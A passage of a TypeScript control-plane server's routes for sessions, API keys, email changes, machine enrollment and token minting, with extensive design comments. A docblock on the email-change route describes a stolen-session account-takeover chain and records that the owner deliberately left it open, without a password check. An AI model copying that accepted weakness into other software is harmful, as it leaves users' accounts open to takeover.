         * nothing they wanted. Revoking *all* of them — including the tab that
         * just did it — reads as the change having failed, and trains people not
         * to change passwords, which is the opposite of the point.
         *
         * A caller on an API key has no session to spare, so `null` revokes the
         * lot. Their key still works: it is a separate credential with a separate
         * lifecycle, and `cpctl` is holding one.
         */
        revoked = revokeAllSessions(db, caller.userId, caller.sessionId, now);

        // Any live reset link dies with the password it would have replaced.
        burnEmailTokens(db, caller.userId, "password_changed", now, "reset");

        // The wall comes down here, and only here and at `POST /v1/reset`.
        db.prepare("DELETE FROM password_obligations WHERE user_id = ?").run(caller.userId);
        db.exec("COMMIT");
      } catch (error) {
        db.exec("ROLLBACK");
        throw error;
      }
      return c.json({ changed: true, sessionsRevoked: revoked });
    } catch (error) {
      if (error instanceof PasswordBusyError) return passwordBusy(c);
      throw error;
    }
  });

  /**
   * Sign out.
   *
   * `DELETE` on the session that made the request, so there is nothing to name and
   * nothing to get wrong. An API key has no session to end — reported as a 409
   * rather than silently succeeding, because "signed out" would be a lie told to a
   * caller whose credential still works.
   */
  app.delete("/v1/me/sessions/current", (c) => {
    const caller = c.get("caller");
    if (caller.sessionId === null) {
      return jsonError(c, 409, "not_a_session", "this credential is an API key; there is no session to end");
    }
    revokeSession(db, caller.sessionId);
    return c.json({ revoked: true });
  });

  /**
   * Sign out everywhere. `?keepCurrent=1` spares the caller's own.
   *
   * **`revokedCount`, not `revoked`.** The two single-session deletes beside this
   * one answer `{revoked: true}` — a boolean saying it happened — and this one
   * answered `{revoked: 3}` under the identical key. Three routes, one field
   * name, two types: a client that reads `body.revoked` as the outcome sees
   * `true` for one session and `0` — falsy, i.e. "it failed" — for the honest
   * answer that there was nothing left to sign out of. One of them had to be
   * renamed and it is the count, because a boolean called `revoked` is what the
   * other two mean and what a fourth route would write.
   */
  app.delete("/v1/me/sessions", (c) => {
    const caller = c.get("caller");
    const keep = c.req.query("keepCurrent") === "1" ? caller.sessionId : null;
    return c.json({ revokedCount: revokeAllSessions(db, caller.userId, keep) });
  });

  /* ---------------------------------------------------------------- *
   * ⚠ THE SECOND LINE. Below it, an account that owes a password change is
   *   refused.
   *
   * **The same mechanism as THE LINE, and for the same reason.** Hono composes
   * in registration order, so "what stays reachable" is "what is registered
   * above this", and a route added anywhere below is covered by doing nothing.
   * The alternative is a per-handler `if`, which is a *list* — and `app.ts`
   * already records what a list costs: four exact-path `app.use` lines meant
   * `POST /v1/machines/:id/enrollments` served with no credential at all. A
   * route that genuinely must stay reachable has to be moved above this line,
   * which is a diff on the line that says what it is.
   *
   * **`403`, not `401`.** Both `packages/web`'s `cpFetch` and `cpctl` treat a
   * 401 as "the stored credential is finished": the client would discard the
   * session, the person would sign in with the same password, and the loop
   * closes. 403 says "you are who you say you are, and this is refused", which
   * is the actual state. The code is distinct from `requireAdmin`'s bare
   * `forbidden` so a client can tell a wall from a permission error.
   *
   * **Credential-blind — it never reads `via`.** An obligation is a property of
   * the account, not of the door it came through. That is safe *because*
   * `withKey` was deleted from user creation in the same change: an account
   * carrying this row cannot hold an API key. Had `withKey` survived, a
   * credential-blind gate would have broken `cpctl` for that person and a
   * `via`-aware one would have been a bypass — both wrong, which is why the two
   * changes are one change.
   *
   * **It is not a security boundary**, and saying so is part of the design:
   * `relay/authorize.ts` reads live user, machine and grant rows and knows
   * nothing about this table, so a token already minted keeps working for its
   * remaining life and an open WebSocket keeps working. What this stops is the
   * account being *used* with a password somebody else chose.
   * ---------------------------------------------------------------- */
  app.use("/v1/*", requirePasswordCurrent(db));

  /** Where you are signed in. Bounded by the per-user cap, so it needs no paging. */
  app.get("/v1/me/sessions", (c) => {
    const caller = c.get("caller");
    return c.json({
      sessions: listSessions(db, caller.userId).map((row) => ({
        id: row.id,
        createdAt: row.createdAt,
        expiresAt: row.expiresAt,
        lastSeenAt: row.lastSeenAt,
        // What the sign-in said about itself. `null` for a session that predates
        // `user_session_origins`, which the client draws as an unknown device
        // rather than as a device called "unknown".
        ip: row.ip,
        userAgent: row.userAgent,
        // Which row is the one asking. Without it a client cannot label "this
        // device", and signing out of the wrong one is the mistake to prevent.
        current: row.id === caller.sessionId,
      })),
    });
  });

  /** Sign out one other device. */
  app.delete("/v1/me/sessions/:id", (c) => {
    const caller = c.get("caller");
    const id = c.req.param("id");
    // Scoped to the caller in the lookup, so somebody else's session id is a 404
    // and never a 403 — the same rule `POST /v1/tokens` uses for machines, so that
    // probing cannot enumerate what exists.
    const row = db.prepare("SELECT id FROM user_sessions WHERE id = ? AND user_id = ?").get(id, caller.userId);
    if (!row) return jsonError(c, 404, "session_not_found", "no such session");
    revokeSession(db, id);
    return c.json({ revoked: true });
  });

  /* ---------------------------------------------------------------- *
   * Your own API keys
   *
   * **`revoked_at` was a column nothing could ever write.** `callerAuth` reads it
   * and answers `api_key_revoked`, so the capability looked present from both
   * ends — the schema has the column, the middleware honours it — while there
   * were three INSERTs, one SELECT, one DELETE inside user deletion, and no
   * `UPDATE api_keys` anywhere in this service. A key was therefore immortal
   * until the account holding it was deleted outright, which is why these two
   * routes exist for *everybody* and not only for an admin: the person most
   * likely to know a key leaked is the person who pasted it somewhere.
   * ---------------------------------------------------------------- */

  /** Your API keys, as much of one as may ever be shown. See `apiKeyRows`. */
  app.get("/v1/me/keys", (c) => c.json({ keys: apiKeyRows(db, c.get("caller").userId) }));

  /**
   * Retire one of your own keys.
   *
   * **Revoking the key you are holding is allowed**, and refusing it would be
   * refusing the whole point: "this key leaked" is precisely the case where the
   * leaked key is the one in your hand. The way back in is a password, which
   * every account created since `POST /v1/admin/users` started generating one
   * has; an account that predates passwords and revokes its only key can mint a
   * replacement with `POST /v1/me/keys` below, and one that has *neither* a
   * password nor a key has nothing left — which is a state this service can no
   * longer create and can no longer repair. See Q7 in `docs/DECISIONS.md`.
   */
  app.delete("/v1/me/keys/:keyId", (c) => {
    // Counted, because revoking is a write and the pair it makes with
    // `POST /v1/me/keys` below is a loop: mint, revoke, repeat, two transactions
    // a turn and a row kept for ever at each end of it.
    const writeGuard = spendWrite(c, "key_revoke");
    if (writeGuard !== null) return writeGuard;

    if (!revokeApiKey(db, c.get("caller").userId, c.req.param("keyId"))) {
      return jsonError(c, 404, "key_not_found", "no such API key, or already revoked");
    }
    return c.json({ revoked: true });
  });

  /**
   * Mint yourself an API key.
   *
   * **This route exists because `POST /v1/admin/users/:id/keys` was deleted**,
   * and that was the only place any key was ever minted for anybody but the
   * bootstrap admin. `cpctl`, `deploy/install.sh` and `~/.reemoat/cpctl.env` all
   * assume keys can exist, so removing the admin door without opening this one
   * would have ended API keys as a credential.
   *
   * **A session is enough; no password is asked** (Q1.630, the owner's decision
   * on 2026-09-04, reversing the rule this route shipped with). The argument
   * for asking was that a session token lives in `localStorage` on an origin
   * with no CSP, so a token lifted from a tab could convert into a permanent
   * credential in one request. What answers it now is that the key is never
   * invisible: every key is listed with when it was made and last used, the
   * one this browser holds is marked, and any of them is one tap to revoke — so
   * a key minted from a borrowed session is a row its owner can see and kill.
   * `POST /v1/me/password` and `PUT /v1/me/email` keep asking, because a
   * password change or a repointed reset channel is the account itself.
   *
   * No body is read: the request carries nothing this route decides on, so a
   * bodiless `POST` mints exactly as `{}` does.
   *
   * **Capped, unlike anything before it.** Nothing bounded `api_keys` because
   * only an admin could write to the table. Every other credential in this
   * service either supersedes its predecessor (`mintEnrollmentCode`,
   * `issueTunnelKey`) or evicts past a cap (`mintSession`); a self-service
   * minter with no bound is unbounded permanent credentials in the database that
   * holds the fleet signing key.
   */
  app.post("/v1/me/keys", async (c) => {
    /*
     * First: the write budget is what bounds a loop against this route now that
     * there is no password to prove, and the cap below is what bounds what a
     * loop could leave behind.
     */
    const writeGuard = spendWrite(c, "key");
    if (writeGuard !== null) return writeGuard;

    const caller = c.get("caller");

    const live = Number(
      db.prepare("SELECT COUNT(*) AS n FROM api_keys WHERE user_id = ? AND revoked_at IS NULL").get(caller.userId)?.[
        "n"
      ] ?? 0,
    );
    if (live >= MAX_KEYS_PER_USER) {
      return jsonError(
        c,
        409,
        "key_limit",
        `an account may hold ${MAX_KEYS_PER_USER} API keys at once — revoke one first`,
      );
    }

    const key = newApiKey();
    db.prepare("INSERT INTO api_keys (id, user_id, prefix, key_hash, created_at) VALUES (?, ?, ?, ?, ?)").run(
      newId("ak"),
      caller.userId,
      key.prefix,
      key.hash,
      Date.now(),
    );
    return c.json({ apiKey: key.key }, 201);
  });

  /* ---------------------------------------------------------------- *
   * Your own address
   * ---------------------------------------------------------------- */

  /**
   * Set or change the address on your account.
   *
   * **A session is enough; no password is asked** (Q1.630, the owner's decision
   * on 2026-09-04). This route asked for the current password unconditionally
   * for one release, and the docblock that argued for it is kept below as the
   * cost, because it is a real one and the next reader must not rediscover it
   * as a bug:
   *
   * ⚠ The address is the reset channel, so repointing it is a way to take the
   * account. The chain, with a stolen session bearer and nothing else: `PUT
   * /v1/me/email` to an attacker address → `POST /v1/me/email/verify` with the
   * same session, whose `held.userId !== caller.userId` check passes *because
   * the token was minted for the caller* → `POST /v1/forgot`, which
   * `verifiedOwnerOf` now resolves to the victim → `POST /v1/reset`, which
   * writes a password the attacker chose, revokes every session including the
   * real owner's, and mints the attacker one. The bootstrap admin is created
   * with no `user_emails` row at all, and so is every account from the no-SMTP
   * arm of `/v1/register` below. **That chain is open again by decision**: the
   * owner weighed it against a password field on every address change and chose
   * the field's absence. What still bounds it is that a session is the thing
   * being stolen either way, that the Devices list shows every sign-in and ends
   * any of them, and that `POST /v1/me/password` still asks — inline, since
   * `proveCurrentPassword`, the helper this route and `/v1/me/keys` shared, is
   * deleted with its two callers.
   *
   * **An address somebody else has already verified is not refused.** Refusing
   * would answer "does this address have an account here" to any signed-in
   * caller, which is the oracle the registration route spends a whole branch
   * avoiding. It is stored as an unverified claim — which the partial unique
   * index makes worth nothing — and the *verification* is what answers 409.
   */
  app.put("/v1/me/email", async (c) => {
    const caller = c.get("caller");
    if (!mailConfigured(db).configured) {
      return jsonError(c, 409, "mail_unconfigured", "this control plane cannot send mail, so it cannot confirm an address");
    }

    const body = await readJsonObject(c);
    const checked = checkEmailAddress(body?.["email"]);
    if (!checked.ok) return jsonError(c, 400, "bad_request", checked.message);

    const existing = emailOf(db, caller.userId);

    if (!mayMail(checked.folded)) {
      return tooManyAttempts(
        c,
        mailThrottle.check(mailKey(checked.folded)).retryAfterSeconds,
        "too many messages to that address — wait and try again",
      );
    }

    const now = Date.now();
    /*
     * The notice to the old address goes **before** the row is overwritten,
     * because afterwards there is nothing left that names it. This is the whole
     * reason the ordering is spelled out rather than left to read naturally.
     *
     * **Sent whether or not the old address was verified**, and it used to carry
     * the same `verifiedAt !== null` test the password gate above did. Together
     * those two meant the takeover was *silent*: the one case that mailed a
     * warning was the one case already refused. There is no new disclosure in
     * dropping it — an unverified address on an account is an address this
     * service has already mailed a verification link to — and the caller now had
     * to present the password to get here at all.
     */
    if (existing !== null && existing.emailFolded !== checked.folded) {
      send(
        existing.email,
        "email_changed",
        emailChanged({
          instance: instanceName(),
          name: caller.name,
          newDomain: checked.folded.slice(checked.folded.lastIndexOf("@") + 1),
        }),
        now + VERIFY_TTL_MS,
      );
    }

    setEmail(db, caller.userId, checked.address, now);
    // Any outstanding reset points at an address this account no longer has.
    burnEmailTokens(db, caller.userId, "email_changed", now, "reset");

    const minted = mintEmailToken(db, caller.userId, "verify", checked.folded, VERIFY_TTL_MS, now);
    send(
      checked.address,
      "verify",
      emailVerify({
        name: caller.name,
        url: `${publicOrigin()}/verify#t=${minted.token}`,
        lifetime: lifetimeText(VERIFY_TTL_MS),
      }),
      minted.expiresAt,
    );

    return c.json({ email: checked.address, verified: false });
  });

  /**
   * Confirm the address on your own account.
   *
   * **Below THE LINE, deliberately**: the token alone must not be enough to
   * change what an account can be reset from — you need the token *and* a
   * session. The cost is one extra sign-in when somebody opens the link in a
   * different browser, which is a sentence on a screen rather than a lockout.
   */
  app.post("/v1/me/email/verify", async (c) => {
    const caller = c.get("caller");
    const body = await readJsonObject(c);
    const token = body?.["token"];
    if (typeof token !== "string" || token.length === 0 || token.length > 200) {
      return jsonError(c, 400, "bad_request", "token is required");
    }

    const now = Date.now();
    const held = readEmailToken(db, token, now);
    if (held === null || held.purpose !== "verify" || held.userId !== caller.userId) {
      return jsonError(c, 409, "token_unusable", "this link is unknown, already used, or expired");
    }

    const current = emailOf(db, caller.userId);
    if (current === null || current.emailFolded !== held.emailFolded) {
      return jsonError(c, 409, "token_unusable", "this link is for an address this account no longer has");
    }

    /*
     * The claim is **inside** the transaction, and it used to sit above it —
     * `POST /v1/reset`'s repair, arriving here for the same reason and with the
     * same reachable case.
     *
     * `claimEmailToken` is the conditional `UPDATE` that makes this link
     * single-use, so out here in autocommit it spent the link and `markVerified`
     * then tripped the partial unique index: `409 email_taken` over a link that
     * was **already burned**, so the person could not retry even once the other
     * account's claim was resolved. Rolled back together, the link stays live and
     * the refusal is about the address rather than about the link.
     *
     * Nothing between the old position and the `COMMIT` awaits, so the whole act
     * is one unit. No `return` from inside the block: the one exit is the
     * `ROLLBACK` below, because an un-rolled-back `BEGIN` takes out the *next*
     * writer on the shared connection.
     */
    db.exec("BEGIN");
    try {
      if (!claimEmailToken(db, token, callerAddress(c), now)) throw new TokenNotClaimed();
      // The boolean, because the unique index is not the only way this fails: a
      // `user_emails` row that moved between `emailOf` above and here matches
      // nothing at all, and an unchecked call answered `{verified: true}` over an
      // address this account no longer holds.
      if (!markVerified(db, caller.userId, held.emailFolded, now)) throw new TokenNotClaimed();
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      if (error instanceof TokenNotClaimed) {
        return jsonError(c, 409, "token_unusable", "this link is unknown, already used, or expired");
      }
      // The partial unique index. Somebody else proved this address first, which
      // is the intended outcome of two accounts claiming one address rather than
      // an error to smooth over — first to prove it wins.
      if (isUniqueViolation(error)) {
        return jsonError(c, 409, "email_taken", "somebody else has already confirmed that address");
      }
      throw error;
    }
    return c.json({ email: current.email, verified: true });
  });

  /** The machines this user may reach. The registry, from the user's side. */
  app.get("/v1/machines", (c) => {
    const caller = c.get("caller");
    const rows = db
      .prepare(
        "SELECT m.id, m.name, m.enrolled_at, g.scopes, o.label FROM grants g " +
          "JOIN machines m ON m.id = g.machine_id " +
          "LEFT JOIN machine_owners o ON o.machine_id = m.id AND o.user_id = g.user_id " +
          "WHERE g.user_id = ? AND m.revoked_at IS NULL " +
          "ORDER BY m.name ASC",
      )
      .all(caller.userId);
    /*
     * Every over-limit machine in the fleet, in one query, tested by membership
     * below — rather than `machineStanding` per row, which is N+1 on the route
     * `packages/web` polls every four seconds per machine.
     *
     * **Over-limit machines are listed rather than filtered out.** Hiding one
     * leaves somebody with a machine they can neither see nor retire, and
     * retiring one is the remedy that frees a slot. `owned` stays true, so the
     * client still draws the control that fixes it.
     */
    const overLimit = overLimitMachineIds(db);
    // The sibling set, for the other gate. Two small queries per listing rather
    // than `machineStanding` per row, which is N+1 on the route the web client
    // polls per machine every four seconds.
    const ownerDisabled = ownerDisabledMachineIds(db);
    return c.json({
      machines: rows.map((row) => ({
        id: String(row["id"]),
        /*
         * Their own label where there is one, the row's real name otherwise —
         * through `labelOrName`, which is the same function `nameVisibleTo` asks.
         *
         * It was an inlined ternary here and a second inlined copy there, which
         * is one rule with two homes and no way to keep them agreeing: this one
         * tested `=== null` alone, so a projection that ever stopped selecting
         * `o.label` would have printed the string `undefined` as a machine name
         * rather than falling back. `name` keeps its meaning for every existing
         * client — `packages/web`'s `MachineRecord.name` and `cpctl machines`
         * both read it and neither changes.
         */
        name: labelOrName(row["label"], String(row["name"])),
        enrolled: row["enrolled_at"] !== null,
        // Whether this row is one they can rename, re-enroll and revoke, or one an
        // admin registered before ownership existed. The client needs it to know
        // which controls to draw.
        owned: row["label"] !== null,
        /*
         * Past its **owner's** limit, so switched off at the relay.
         *
         * Computed for every row including ones somebody else owns and shared
         * with this caller: the limit belongs to the owner, so a grantee's
         * access to an over-limit machine is dead too, and this is where they
         * learn why rather than watching it read "offline" for ever.
         */
        overLimit: overLimit.has(String(row["id"])),
        /*
         * Its owner is banned. Only ever true for a machine somebody *else*
         * owns — a banned owner cannot reach this route at all — which is
         * exactly the case that used to be invisible: their machine went on
         * working for every grantee and nothing said the owner was gone.
         */
        ownerDisabled: ownerDisabled.has(String(row["id"])),
        scopes: parseScopes(String(row["scopes"])),
        relayUrl: relayUrlFor(String(row["id"])),
        relayOnline: relayOnline(String(row["id"])),
        /*
         * Beside `relayOnline` rather than folded into it: that is a boolean
         * about *now* and had nothing behind it, so a laptop whose lid closed a
         * minute ago and a host that died last week were the same row. This is
         * the question anybody actually asks about a machine that is not
         * answering, and until the table existed nothing could answer it.
         */
        lastSeenAt: lastSeenAt(String(row["id"])),
      })),
    });
  });

  /**
   * Register a machine, for yourself.
   *
   * **This is the route the admin used to be on the critical path of.** It
   * registers the machine, grants it to its creator, and mints the enrollment
   * code, in one request — because those three were separate acts, none implied
   * the others, and both wizards printed the missing third as a hint and ran
   * neither. A daemon that enrolls and that nobody can see is the failure this
   * exists to remove.
   *
   * An admin can still register one *for* somebody through `/v1/admin/machines`,
   * and that grants nothing new: an admin can already mint an API key for any
   * user and act as them.
   */
  app.post("/v1/machines", async (c) => {
    /*
     * Counted before anything reads or writes, for the enrollments route's
     * reason: `createOwnedMachine` inserts the machine, the ownership row and the
     * grant, and `mintEnrollmentCode` opens a second transaction — every
     * successful call is permanent rows, and `ensureSigningKey` below is a write
     * of its own on a fresh instance.
     */
    const writeGuard = spendWrite(c, "machine");
    if (writeGuard !== null) return writeGuard;

    const caller = c.get("caller");
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const named = readLabel(body["name"]);
    if (!named.ok) return jsonError(c, 400, "bad_request", named.message);
    const label = named.label;

    ensureSigningKey(db);

    /*
     * Wider than the unique index on purpose — see `nameVisibleTo`. Two rows
     * reading the same word in one person's list is worse than a refusal, because
     * the name is also how they name the machine to `POST /v1/tokens`.
     */
    if (nameVisibleTo(db, caller.userId, label)) {
      return jsonError(c, 409, "machine_exists", "you can already see a machine with that name");
    }

    const quota = effectiveLimit(db, caller.userId);
    const created = createOwnedMachine(db, caller.userId, label, ALL_SCOPES, quota.limit);
    if ("error" in created) {
      if (created.error === "too_many") {
        /*
         * `409 machine_limit` is reused rather than replaced — every existing
         * client keys on this code, and it still means exactly what it meant.
         * What changed is the number in the sentence, and that a limit of zero
         * gets its own: "you may own at most 0 machines" is arithmetic where the
         * reader needs a remedy, and this is the state a fresh account on a
         * closed instance lands in. `detail` carries the numbers so a client
         * drawing a count is not parsing prose.
         */
        return jsonError(
          c,
          409,
          "machine_limit",
          quota.limit === 0
            ? "this instance does not hand out machines by default. Ask whoever runs it to raise your limit."
            : `you may own at most ${quota.limit} machine${quota.limit === 1 ? "" : "s"}. ` +
                "Retire one, or ask whoever runs this control plane to raise the limit.",
          { owned: machineCount(db, caller.userId), limit: quota.limit },
        );
      }
      // Their own namespace, so this says exactly what happened and leaks nothing.
      return jsonError(c, 409, "machine_exists", "you already have a machine with that name");
    }

    const enrollment = mintEnrollmentCode(db, created.id, caller.userId, ENROLLMENT_CODE_TTL_MS);
    return c.json(
      {
        machine: {
          id: created.id,
          name: label,
          enrolled: false,
          owned: true,
          // False by construction — it was just created inside the limit, and
          // it is the newest, so nothing else moved. Carried for shape parity
          // with `GET /v1/machines`: three routes describing one thing with
          // three different field sets is what `adminMachineProjection` exists
          // to stop.
          overLimit: false,
          // Also false by construction: they just created it, so they are their
          // own owner and `callerAuth` would not have let a banned caller here.
          ownerDisabled: false,
          scopes: [...ALL_SCOPES],
          relayUrl,
          relayOnline: false,
        },
        enrollment: { code: enrollment.code, expiresAt: enrollment.expiresAt },
        // The address the daemon will dial, from the server rather than from the
        // browser's own origin: in dev that origin is Vite's port, which proxies
        // /v1 and would be pasted onto a machine that cannot reach it.
        controlPlaneUrl: installOrigin(c, trustedProxyHops),
      },
      201,
    );
  });

  /**
   * Rename, re-enroll or revoke a machine you own.
   *
   * **A machine you do not own is a 404, never a 403.** Same rule as
   * `POST /v1/tokens`: a caller must not be able to map the fleet by watching
   * which ids answer differently. It also means a machine registered before
   * ownership existed answers 404 here and stays admin-managed, which is the
   * correct answer rather than a gap — nobody created it through this route.
   */
  const ownedMachine = (c: Context<AppEnv>): OwnedMachine | null => {
    const owner = ownerOf(db, c.req.param("id") ?? "");
    if (owner === null) return null;
    return owner.userId === c.get("caller").userId ? owner : null;
  };

  app.patch("/v1/machines/:id", async (c) => {
    /*
     * A rename is a write like the rest, and this route was the one the list
     * below forgot. `relabelMachine` is an unconditional `UPDATE` on
     * `machine_owners` — and it is reachable in a loop, because `nameVisibleTo`
     * excludes *this* machine, so renaming it to the name it already has
     * succeeds. Under `PRAGMA synchronous = FULL`, on the file the relay reads
     * tunnel rows out of, that is one fsync a request for as long as somebody
     * cares to send them.
     *
     * Counted before the ownership lookup for the reason every other guard here
     * is first: a refusal must not be the expensive path.
     */
    const writeGuard = spendWrite(c, "machine_rename");
    if (writeGuard !== null) return writeGuard;

    const owned = ownedMachine(c);
    if (owned === null) return jsonError(c, 404, "machine_not_found", "no such machine");
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const named = readLabel(body["name"]);
    if (!named.ok) return jsonError(c, 400, "bad_request", named.message);
    const label = named.label;
    // Excluding this machine, or renaming it to the name it already has would
    // refuse itself.
    if (nameVisibleTo(db, c.get("caller").userId, label, owned.id)) {
      return jsonError(c, 409, "machine_exists", "you can already see a machine with that name");
    }
    // The owner is in the statement as well as resolved above, so the `UPDATE`
    // is safe read on its own rather than only in the light of `ownedMachine`.
    const failed = relabelMachine(db, owned.id, owned.userId, label);
    if (failed !== null) return jsonError(c, 409, "machine_exists", "you already have a machine with that name");
    return c.json({ id: owned.id, name: label, owned: true });
  });

  /**
   * A fresh enrollment code for a machine you own.
   *
   * Allowed whether or not it has already enrolled, and that is deliberate.
   * Redeeming a code rotates the machine's tunnel credential, so re-enrolling
   * *does* take the machine away from whatever is currently holding it — but
   * since only the owner can ask, the thing it takes it away from is their own
   * daemon, which is what re-installing a host means. Minting alone changes
   * nothing until somebody redeems it.
   */
  app.post("/v1/machines/:id/enrollments", (c) => {
    /*
     * **The most expensive write an ordinary account can drive, and nothing
     * counted it.** `mintEnrollmentCode` opens a transaction, supersedes the old
     * row and inserts a new one under `PRAGMA synchronous = FULL`, on the
     * database the relay shares. When this was written that table had no sweeper
     * either, so every request was a row that stayed; `pruneEnrollmentCodes` runs
     * at boot and on the sweep now, which leaves this a cost per request rather
     * than one that accumulates. Counted before the ownership lookup
     * for the reason the guard in `registry.create` is first: a refusal must not
     * be the expensive path.
     */
    const writeGuard = spendWrite(c, "enroll");
    if (writeGuard !== null) return writeGuard;

    const owned = ownedMachine(c);
    if (owned === null) return jsonError(c, 404, "machine_not_found", "no such machine");
    const machine = db.prepare("SELECT revoked_at FROM machines WHERE id = ?").get(owned.id);
    /*
     * The missing row is its own answer, and it used to be the wrong one.
     * `machine?.["revoked_at"] !== null` evaluates `undefined !== null` when
     * there is no row at all, so a machine that does not exist was reported as
     * one that had been *revoked* — a 403 about the state of something with no
     * state. Only reachable through an ownership row outliving its machine, which
     * is exactly the sort of inconsistency somebody would be trying to diagnose.
     */
    if (!machine) return jsonError(c, 404, "machine_not_found", "no such machine");
    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }
    /*
     * Over its owner's limit, so refused — because the code would work and the
     * daemon would not. Redeeming it rotates the tunnel credential and produces
     * a host that dials in, is refused at the relay, and reads as offline: the
     * "enrolled and nobody can see it" failure this file has already closed
     * twice, arriving through a new door.
     *
     * Only the owner reaches this route, so the message can name the remedy.
     */
    const standing = machineStanding(db, owned.id);
    if (standing !== null && standing.over) {
      return jsonError(
        c,
        403,
        "machine_over_limit",
        "this machine is over your machine limit and is switched off, so a new code would not " +
          "bring it back. Retire another machine, or ask whoever runs this control plane to raise the limit.",
      );
    }
    ensureSigningKey(db);
    const minted = mintEnrollmentCode(db, owned.id, c.get("caller").userId, ENROLLMENT_CODE_TTL_MS);
    return c.json(
      { code: minted.code, machineId: owned.id, expiresAt: minted.expiresAt, controlPlaneUrl: installOrigin(c, trustedProxyHops) },
      201,
    );
  });

  /**
   * Retire a machine you own.
   *
   * Without this, machines only accumulate: the admin has no lever over them by
   * design, so if the owner has none either then nothing can ever remove one.
   *
   * **Three writes, one transaction, and the third one was missing entirely.**
   * Revoking used to mark the machine and burn its codes as two statements, and
   * never dropped the ownership row — so a revoked machine went on holding its
   * label and one of `MAX_MACHINES_PER_USER` for ever. Revoke `laptop`, create
   * `laptop` again, and the answer is a 409 naming a machine that appears in no
   * list and can never be reached; fifty revocations and the account cannot add a
   * machine at all, with nothing on screen to explain it. See `releaseOwner`.
   *
   * The transaction is what makes the three one act. Partially applied, the worst
   * arrangement is a machine marked revoked whose codes are still live — a code
   * mints a full machine identity *and* rotates the tunnel key, so a crash between
   * the two statements leaves a revocation that a five-minute-old code undoes.
   */
  app.post("/v1/machines/:id/revoke", (c) => {
    // The other half of the create loop, and counted before the ownership lookup
    // for the same reason: a refusal must not be the expensive path. Three
    // statements in one transaction under `PRAGMA synchronous = FULL`, on the
    // file the relay is reading tunnel rows out of.
    const writeGuard = spendWrite(c, "machine_revoke");
    if (writeGuard !== null) return writeGuard;

    const owned = ownedMachine(c);
    if (owned === null) return jsonError(c, 404, "machine_not_found", "no such machine");
    const now = Date.now();
    let changed = 0;
    let burned = 0;
    /*
     * Nothing returns from inside the block, deliberately: an early `return`
     * between BEGIN and COMMIT leaves the transaction open on a shared
     * synchronous connection, and the next writer inherits it. The "already
     * revoked" refusal is therefore raised afterwards, off a flag.
     */
    db.exec("BEGIN");
    try {
      changed = Number(
        db
          .prepare("UPDATE machines SET revoked_at = ? WHERE id = ? AND revoked_at IS NULL")
          .run(now, owned.id).changes,
      );
      if (changed === 1) {
        burned = burnMachineCodes(db, owned.id, now);
        releaseOwner(db, owned.id);
      }
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }
    if (changed !== 1) return jsonError(c, 404, "machine_not_found", "no such machine, or already revoked");
    return c.json({
      revoked: true,
      enrollmentCodesInvalidated: burned,
      outstandingTokensExpireWithinSeconds: tokenTtlSeconds,
    });
  });

  /**
   * The whole point of this service: a short-lived token for one machine.
   *
   * Every check is here, and none of it is re-checkable later by the daemon —
   * the daemon verifies a signature and an audience, and trusts that whoever
   * signed it had already asked these questions.
   */
  app.post("/v1/tokens", async (c) => {
    // One Ed25519 signature and five indexed reads per call, unbounded until now.
    // The web client mints one per machine per ~210s, so this is only ever reached
    // by something in a loop.
    const writeGuard = spendWrite(c, "token");
    if (writeGuard !== null) return writeGuard;

    const caller = c.get("caller");
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const machineRef = body["machine"];
    if (typeof machineRef !== "string" || machineRef.length === 0) {
      return jsonError(c, 400, "bad_request", "machine is required");
    }

    /*
     * By the caller's own label first, then by id, then by the row's real name.
     *
     * The label is what they see and what they type; the other two are what a
     * script and a legacy machine use. Deliberately not *somebody else's* label —
     * scoping labels per owner is only meaningful if resolution is scoped too.
     */
    const resolvedId = resolveMachineRef(db, caller.userId, machineRef);
    const machine =
      resolvedId === null
        ? undefined
        : db.prepare("SELECT id, name, enrolled_at, revoked_at FROM machines WHERE id = ?").get(resolvedId);
    if (!machine) return jsonError(c, 404, "machine_not_found", "no such machine");

    const machineId = String(machine["id"]);

    const grant = db
      .prepare("SELECT scopes FROM grants WHERE user_id = ? AND machine_id = ?")
      .get(caller.userId, machineId);
    // The same 404 as an unknown machine. A user with no grant should not be
    // able to enumerate the fleet by watching 403s come back instead of 404s.
    if (!grant) return jsonError(c, 404, "machine_not_found", "no such machine");

    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }
    if (machine["enrolled_at"] === null) {
      return jsonError(c, 409, "machine_not_enrolled", "this machine has not enrolled yet");
    }

    /*
     * Over its owner's limit, and refused **after** the grant above for the
     * reason that 404 gives: this refusal names a real state, so asked before a
     * grant is proved it would be an enumeration oracle — any valid token would
     * report whether an arbitrary machine exists and is over somebody's limit.
     *
     * Refused here at all, rather than left to the relay, because the tunnel is
     * refused at dial: `relayOnline` is already false, so a client handed a
     * perfectly good token would draw "your machine is asleep" and send somebody
     * to restart a daemon that is running fine. This is the one place a sentence
     * reaches the person at the moment they ask.
     *
     * A distinct code from `machine_revoked`, because a client has to be able to
     * tell "switched off, reversible, nothing was deleted" from "retired".
     */
    const standing = machineStanding(db, machineId);
    // The owner's ban, checked here too so the person is told rather than left
    // watching a machine that mints a token and then answers 403 at the relay.
    // Only a grantee can reach this: a disabled owner cannot get past
    // `callerAuth` to ask for a token at all.
    if (standing !== null && standing.ownerDisabled) {
      return jsonError(
        c,
        403,
        "owner_disabled",
        "this machine's owner has been disabled, so it is switched off",
      );
    }
    if (standing !== null && standing.over) {
      return jsonError(
        c,
        403,
        "machine_over_limit",
        standing.ownerId === caller.userId
          ? "this machine is over your machine limit and is switched off. Retire another machine, or ask " +
              "whoever runs this control plane to raise the limit — nothing has been deleted."
          : "this machine is over its owner's machine limit and is switched off",
      );
    }

    const keys = activeSigningKeys(db);
    const signing = keys[0];
    if (!signing) return jsonError(c, 503, "no_signing_key", "this control plane has no signing key");

    const scopes = parseScopes(String(grant["scopes"]));
    if (scopes.length === 0) {
      return jsonError(c, 403, "no_scopes", "this grant carries no usable scopes");
    }

    const nowSeconds = Math.floor(Date.now() / 1000);
    const claims: TokenClaims = {
